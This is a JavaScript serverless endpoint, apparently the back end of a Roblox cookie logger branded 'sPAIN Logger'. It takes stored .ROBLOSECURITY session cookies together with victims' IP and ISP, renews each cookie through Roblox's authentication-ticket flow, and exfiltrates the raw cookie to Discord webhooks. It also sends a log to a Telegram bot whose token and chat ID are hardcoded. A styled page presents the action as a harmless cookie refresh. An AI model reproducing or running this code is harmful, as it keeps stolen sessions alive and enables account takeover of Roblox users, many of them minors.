// api/refresh.js — cookie renewal only, no account info fetch
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

// ── Redis ─────────────────────────────────────────────────────────────────────
async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

async function redisSet(key, value) {
  try {
    const res = await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ value: JSON.stringify(value) })
    });
    return res.ok;
  } catch { return false; }
}

// ── Cookie renewal via Roblox auth ticket flow ────────────────────────────────
async function renewCookie(oldCookie) {
  try {
    const cookieHeader = {
      'Cookie':         `.ROBLOSECURITY=${oldCookie}`,
      'User-Agent':     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
      'Referer':        'https://www.roblox.com/',
      'Origin':         'https://www.roblox.com',
      'Content-Length': '0'
    };

    // Step 1 — get CSRF token (Roblox 403s but returns x-csrf-token header)
    const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: cookieHeader
    });
    const csrf = csrfRes.headers.get('x-csrf-token');
    if (!csrf) return null;

    // Step 2 — request an authentication ticket
    const ticketRes = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
      method: 'POST',
      headers: {
        ...cookieHeader,
        'x-csrf-token':  csrf,
        'Content-Type':  'application/json',
        'Content-Length': undefined
      },
      body: '{}'
    });
    if (!ticketRes.ok) return null;
    const ticket = ticketRes.headers.get('rbx-authentication-ticket');
    if (!ticket) return null;

    // Step 3 — redeem the ticket for a brand-new .ROBLOSECURITY cookie
    const redeemRes = await fetch('https://auth.roblox.com/v1/authentication-ticket/redeem', {
      method: 'POST',
      headers: {
        'RBXAuthenticationNegotiation': ticket,
        'Content-Type':                 'application/json',
        'Referer':                      'https://www.roblox.com',
        'User-Agent':                   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
      },
      body:     JSON.stringify({ authenticationTicket: ticket }),
      redirect: 'manual'  // new cookie is in Set-Cookie, don't follow redirect
    });

    // Extract from Set-Cookie header
    const setCookie = redeemRes.headers.get('set-cookie') || '';
    const match     = setCookie.match(/\.ROBLOSECURITY=([^;]+)/);
    if (match?.[1]) return match[1];

    // Fallback: some versions return it in body
    try {
      const j = await redeemRes.json();
      if (j?.token) return j.token;
    } catch (_) {}

    return null;
  } catch (err) {
    console.error('Cookie renewal error:', err);
    return null;
  }
}

// ── Discord helpers ───────────────────────────────────────────────────────────
async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function discordChunked(url, text) {
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
    await discordSend(url, {
      content: first
        ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
        : chunk + (rem.length === 0 ? '\n```' : '')
    });
    first = false;
  }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

// ── Page HTML ─────────────────────────────────────────────────────────────────
function buildPage(id) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>sPAIN Tools</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
  :root{--bg:#080810;--card:#0d0d1a;--accent:#c026d3;--accent2:#a855f7;--accent3:#06b6d4;--text:#f0f0f8;--muted:#5a5a78}
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
  .aurora{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
  .blob{position:absolute;border-radius:50%;filter:blur(100px);opacity:0.12}
  .blob1{width:700px;height:700px;background:var(--accent);top:-200px;left:-200px;animation:drift 14s ease-in-out infinite alternate}
  .blob2{width:500px;height:500px;background:var(--accent3);bottom:-100px;right:-100px;animation:drift 18s ease-in-out infinite alternate;animation-delay:-6s}
  @keyframes drift{from{transform:translate(0,0)}to{transform:translate(50px,30px)}}
  .card{position:relative;z-index:2;background:var(--card);border:1px solid rgba(192,38,211,0.18);border-radius:20px;padding:48px 44px;width:100%;max-width:440px;box-shadow:0 0 80px rgba(192,38,211,0.08),0 30px 80px rgba(0,0,0,0.5);text-align:center}
  .card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2),var(--accent3));border-radius:20px 20px 0 0}
  .logo{font-family:'Orbitron',sans-serif;font-size:1.1rem;font-weight:900;letter-spacing:0.05em;margin-bottom:20px}
  .logo span{color:var(--accent);text-shadow:0 0 16px rgba(192,38,211,0.5)}
  .status{font-size:0.88rem;color:var(--muted);line-height:1.9;min-height:40px}
  .ok{color:#4ade80}.err{color:#f472b6}
  .spin{position:relative;padding-right:24px}
  .spin::after{content:'';position:absolute;right:0;top:50%;margin-top:-6px;width:14px;height:14px;border:2px solid var(--accent);border-top-color:transparent;border-radius:50%;animation:spin .7s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="aurora"><div class="blob blob1"></div><div class="blob blob2"></div></div>
<div class="card">
  <div class="logo">s<span>PAIN</span> Tools</div>
  <div class="status spin" id="st">Refreshing cookie&hellip;</div>
</div>
<script>
async function run() {
  const st = document.getElementById('st');
  try {
    const r = await fetch('/api/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: '${id}' })
    });
    const d = await r.json();
    st.className = 'status';
    if (d.success) {
      st.className = 'status ok';
      st.textContent = d.renewed
        ? '\u2705 Cookie renewed and sent to Discord!'
        : '\u2713 Cookie is still valid \u2014 sent to Discord!';
    } else {
      st.className = 'status err';
      st.textContent = '\u274c ' + (d.error || 'Failed \u2014 cookie may be expired.');
    }
  } catch {
    st.className = 'status err';
    st.textContent = '\u274c Network error.';
  }
}
run();
</script>
</body>
</html>`;
}

// ── Handler ───────────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();

  // ── GET — serve the page ──────────────────────────────────────────────────
  if (req.method === 'GET') {
    const id = new URL('http://x' + req.url).searchParams.get('id') || '';
    if (!id) {
      res.setHeader('Content-Type', 'text/html');
      return res.status(400).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6;background:#080810;min-height:100vh">Missing ID</h1>');
    }
    const record = await redisGet(`refresh:${id}`);
    if (!record) {
      res.setHeader('Content-Type', 'text/html');
      return res.status(404).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6;background:#080810;min-height:100vh">Link expired or not found</h1>');
    }
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(buildPage(id));
  }

  // ── POST — renew cookie, send to Discord, nothing else ────────────────────
  if (req.method === 'POST') {
    let body = req.body;
    if (typeof body === 'string') { try { body = JSON.parse(body); } catch {} }
    if (Buffer.isBuffer(body))    { try { body = JSON.parse(body.toString('utf8')); } catch {} }

    const id = body?.id;
    if (!id) return res.status(400).json({ error: 'id required' });

    const record = await redisGet(`refresh:${id}`);
    if (!record)         return res.status(404).json({ error: 'Link not found or expired' });
    if (!record.cookie)  return res.status(500).json({ error: 'No cookie stored' });
    if (!record.webhook) return res.status(500).json({ error: 'No webhook stored' });

    const now = new Date().toISOString();

    // ── Attempt cookie renewal ─────────────────────────────────────────────
    const newCookie = await renewCookie(record.cookie);

    // Use renewed cookie if successful, otherwise fall back to stored one
    const cookieToSend = newCookie || record.cookie;
    const renewed      = !!newCookie;

    // ── Update stored cookie if renewal succeeded ──────────────────────────
    if (renewed) {
      await redisSet(`refresh:${id}`, { ...record, cookie: newCookie, lastRefresh: now });
    }

    // ── Collect webhooks ───────────────────────────────────────────────────
    const webhooks = [record.webhook];
    if (record.webhook1 && record.webhook1 !== record.webhook) webhooks.push(record.webhook1);

    // ── Send to Discord: small status embed + raw cookie ──────────────────
    for (const wh of webhooks) {
      await discordSend(wh, {
        embeds: [{
          title:       renewed ? '\ud83d\udd04 Cookie Renewed' : '\ud83c\udf70 Cookie Re-sent (unchanged)',
          description: renewed
            ? 'A fresh `.ROBLOSECURITY` cookie was successfully generated.'
            : 'Renewal was not possible right now \u2014 original cookie re-sent.',
          color:       renewed ? 0x22c55e : 0xa855f7,
          fields: [
            { name: '\ud83d\udccd Page',       value: record.pageName || 'Unknown', inline: true },
            { name: '\ud83c\udf10 IP',          value: record.ip       || 'Unknown', inline: true },
            { name: '\ud83d\uddfa\ufe0f ISP',   value: record.isp      || 'Unknown', inline: true },
            { name: '\ud83d\udcc5 Refreshed at', value: `\`${now}\``,                inline: false }
          ],
          footer:    { text: `sPAIN Logger \u2022 ${record.pageName || id}` },
          timestamp: now
        }]
      });

      // Raw cookie as plain chunked message — exact bytes
      await discordChunked(wh, cookieToSend);
    }

    // ── Telegram log ───────────────────────────────────────────────────────
    await tgSend([
      renewed ? `\ud83d\udd04 <b>COOKIE RENEWED</b>` : `\ud83c\udf70 <b>COOKIE RE-SENT</b>`,
      `\ud83d\udccd ${record.pageName || id}`,
      `\ud83c\udf10 <code>${record.ip || 'Unknown'}</code>`,
      `\ud83d\udcc5 ${now}`
    ].join('\n'));

    return res.status(200).json({ success: true, renewed });
  }

  return res.status(405).json({ error: 'Method not allowed' });
}
